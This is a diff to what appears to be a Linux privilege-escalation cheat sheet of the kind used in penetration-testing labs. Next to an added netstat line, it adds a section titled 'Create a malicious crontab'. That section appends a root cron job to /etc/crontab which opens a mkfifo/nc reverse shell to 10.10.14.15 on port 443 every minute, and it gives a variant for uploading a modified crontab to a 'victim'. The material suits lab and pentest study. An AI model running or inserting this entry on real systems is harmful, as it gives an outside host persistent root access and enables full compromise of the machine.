@@ -35,6 +35,7 @@ route
 ip route
 # display active network connections and listening ports
 netstat -ano
+netstat -ant
 netstat -a # shows all listening ports and established connections
 netstat -at # list tcp protocols
 netstat -au # list udp protocols
@@ -137,6 +138,20 @@ You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.
 ```bash
 # print both commands and file system events and scan procfs every 1000 ms (=1sec)
 ./pspy64 -pf -i 1000 
+```
+
+#### Create a malicious crontab
+
+```bash
+echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f ' >> /etc/crontab
+
+# if you don't have direct write access, try...
+## locally
+cp /etc/crontab .
+echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f ' >> crontab
+
+# on victim
+upload crontab
 ```
 
 ### Systemd timers
